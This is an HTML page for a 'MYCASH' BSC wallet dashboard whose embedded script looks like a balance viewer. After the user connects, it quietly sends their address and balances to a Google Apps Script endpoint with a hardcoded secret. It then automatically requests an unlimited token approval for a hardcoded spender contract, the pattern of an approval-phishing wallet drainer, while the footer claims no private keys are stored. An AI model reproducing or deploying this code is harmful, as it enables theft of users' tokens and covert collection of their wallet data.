<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH â€” BSC Wallet</title>
  <style>
    body{font-family:system-ui,Segoe UI,Arial;background:#0b1220;color:#e6eef8;margin:0}
    header{background:#071027;padding:12px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03)}
    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
    .nav-left{display:flex;gap:14px}
    a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px}
    a:hover{background:#0f1b33}
    .logo{font-weight:700;letter-spacing:4px}
    .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer}
    main{max-width:980px;margin:20px auto;padding:16px}
    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
    .stat{flex:1 1 220px;background:#071427;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
    .muted{color:#9fb0c8}
    .tokens{margin-top:14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
    .token{background:#071427;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.02)}
    footer{max-width:980px;margin:24px auto;padding:12px;color:#9fb0c8;text-align:center}
    button{cursor:pointer}
    .small { font-size:0.9rem; color:#9fb0c8; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
  </style>
</head>
<body>

  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
        <a href="reward.html">Rewards</a>
      </div>

      <div class="logo">MYCASH</div>

      <div>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <div class="card">
      <h2>Wallet</h2>
      <div class="row">
        <div class="stat">
          <div class="muted">Status</div>
          <div id="statusText">Not connected</div>
        </div>

        <div class="stat">
          <div class="muted">Address</div>
          <div id="walletAddress" class="mono">â€”</div>
        </div>

        <div class="stat">
          <div class="muted">User ID</div>
          <div id="userId" class="mono">-</div>
        </div>

        <div class="stat">
          <div class="muted">Network</div>
          <div id="walletNetwork">â€”</div>
        </div>
        <div class="stat">
          <div class="muted">BNB Balance</div>
          <div id="walletBalance">â€”</div>
        </div>
      </div>

      <div style="margin-top:18px">
        <h3 class="muted">Tokens</h3>
        <div id="tokens" class="tokens">
          <div class="muted">Connect wallet to see token balance.</div>
        </div>
      </div>
    </div>
  </main>

  <footer>
    Â© <span id="year"></span> MYCASH â€” BSC (BEP-20) â€¢ No private keys stored.
  </footer>

  <!-- libs -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- app script (this is your original working script) -->
  <script type="module">
  (function(){
    // ===== CONFIG =====
    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
    const APPS_SCRIPT_SECRET = "mahfuzinam0045";

    // ðŸ”¥ IMPORTANT:
    // 1) TOKEN_ADDRESS MUST be a BEP-20 TOKEN CONTRACT, not your wallet.
    // 2) SPENDER_ADDRESS is your smart contract that will be approved.
    const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
    const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract

    const BNB_TESTNET_CHAIN_ID_DEC = 97;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
    const BNB_TESTNET_LABEL        = "BSC Testnet (97)";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)"
    ];

    let web3ModalInstance = null;
    let providerInstance  = null;
    let web3Instance      = null;

    // ===== helpers =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }

    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000); // 100000â€“999999
      return String(num);
    }

    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // UI refs
    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }

    function setWalletInfo(address, network, bnb){
      walletAddressEl.textContent = address || "â€”";
      walletNetworkEl.textContent = network || "â€”";
      walletBalanceEl.textContent =
        (bnb === null || bnb === undefined) ? "â€”" : (Number(bnb).toFixed(6) + " BNB");
    }

    function setUserIdUI(id){
      userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      setStatus("Not connected");
      setWalletInfo("â€”","â€”","â€”");
      setUserIdUI("-");
      tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
    }

    function initWeb3ModalInstance(){
      const providerOptions = {
        walletconnect: {
          package: window.WalletConnectProvider.default,
          options: {
            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
            bridge: "https://bridge.walletconnect.org",
            qrcode: true
          }
        }
      };
      web3ModalInstance = new window.Web3Modal.default({
        cacheProvider: true,
        providerOptions
      });
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", function(accounts){
          if(!accounts || !accounts.length){ clearSessionUI(); return; }
          const addr = accounts[0].toLowerCase();
          const uid  = getOrCreateUserIdFor(addr);
          setWalletInfo(addr, walletNetworkEl.textContent || BNB_TESTNET_LABEL, null);
          setUserIdUI(uid);
        });
        p.on("chainChanged", function(){ location.reload(); });
        p.on("disconnect", function(){ clearSessionUI(); });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address,
          network     : networkText,
          timestamp   : new Date().toISOString(),
          userId      : userId,
          bnbBalance  : String(bnbBalance ?? ""),
          tokenBalance: String(tokenBalance ?? "")
        });

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
          },
          body: payload.toString()
        });

        console.log("Sent log to Apps Script (no-cors).");
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(!TOKEN_ADDRESS){
          console.warn("TOKEN_ADDRESS not set, skipping token balance");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }

        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, 18); // assumes 18 decimals
        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: BNB_TESTNET_CHAIN_ID_HEX,
                chainName: "BNB Smart Chain Testnet",
                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
                blockExplorerUrls:["https://testnet.bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BSC Testnet:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    // ðŸ”¥ Ask the user to approve your smart contract as spender
    async function requestTokenApproval(){
      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        alert("TOKEN_ADDRESS is empty. Set your BEP-20 token contract address in the code.");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        alert("SPENDER_ADDRESS is empty. Set your smart contract address in the code.");
        return;
      }
      if(!providerInstance){
        console.warn("No providerInstance for approval");
        return;
      }

      try{
        setStatus("Requesting token approvalâ€¦");
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const signer         = await ethersProvider.getSigner();
        const userAddress    = (await signer.getAddress()).toLowerCase();

        // Safety: don't allow using the wallet itself as TOKEN_ADDRESS
        if (TOKEN_ADDRESS.toLowerCase() === userAddress) {
          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
          setStatus("Connected (approval skipped)");
          return;
        }

        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
        const amount         = ethers.MaxUint256;

        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
        console.log("Approve tx sent:", tx.hash);
        setStatus("Waiting for approval confirmationâ€¦");
        const receipt = await tx.wait();
        console.log("Approve confirmed:", receipt);
        setStatus("Connected + Approved âœ…");
      }catch(err){
        console.error("Token approve error:", err);
        alert("Token approval failed: " + (err && err.message ? err.message : err));
        setStatus("Connected (approval failed)");
      }
    }

    async function connectFlow(){
      try{
        setStatus("Connectingâ€¦");
        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
          providerInstance = window.trustwallet.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        } else if(window.ethereum && !mobile){
          providerInstance = window.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        } else {
          if(!web3ModalInstance) initWeb3ModalInstance();
          providerInstance = await web3ModalInstance.connect();
          web3Instance     = new Web3(providerInstance);
        }

        if(!providerInstance || !web3Instance){
          setStatus("No provider");
          alert("No wallet provider detected.");
          return;
        }

        attachProviderListeners(providerInstance);

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account");
          return;
        }
        const address = accounts[0].toLowerCase();

        let chainId = await web3Instance.eth.getChainId();
        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BSC Testnet.");
            setStatus("Wrong network");
            return;
          }
          chainId = await web3Instance.eth.getChainId();
          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
            alert("Network switch failed");
            return;
          }
        }

        const balanceWei = await web3Instance.eth.getBalance(address);
        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));

        setStatus("Connected");
        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);

        const userId = getOrCreateUserIdFor(address);
        setUserIdUI(userId);

        tokensContainer.innerHTML = '<div class="muted">Loading token balanceâ€¦</div>';

        const tokenBalance = await getTokenBalance(address);

        // Show token card
        const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
        tokensContainer.innerHTML =
          '<div class="token">' +
            '<div class="muted">Token</div>' +
            '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
            '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
          '</div>';

        await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);

        // ðŸ”¥ Auto request approval after connect
        await requestTokenApproval();

      }catch(err){
        console.error("connectFlow error:", err);
        setStatus("Connection failed");
        alert("Connection failed: " + (err && err.message ? err.message : err));
      }
    }

    async function tryAutoReconnect(){
      try{
        if(!web3ModalInstance) initWeb3ModalInstance();

        if(window.ethereum){
          const injected = window.ethereum;
          const accounts = await injected.request({ method: "eth_accounts" });
          if(accounts && accounts.length){
            providerInstance = injected;
            web3Instance     = new Web3(providerInstance);
            attachProviderListeners(providerInstance);
            const address    = accounts[0].toLowerCase();
            setStatus("Restoring sessionâ€¦");
            const balanceWei = await web3Instance.eth.getBalance(address);
            const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
            const userId     = getOrCreateUserIdFor(address);
            setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
            setUserIdUI(userId);
            tokensContainer.innerHTML = '<div class="muted">Connect again to approve token.</div>';
            setStatus("Connected (restored)");
            return;
          }
        }

        clearSessionUI();
      }catch(err){
        console.warn("Auto-reconnect error:", err);
        clearSessionUI();
      }
    }

    document.addEventListener("DOMContentLoaded", async function(){
      initWeb3ModalInstance();
      connectBtn.addEventListener("click", connectFlow);
      await tryAutoReconnect();
      document.getElementById("year").textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>
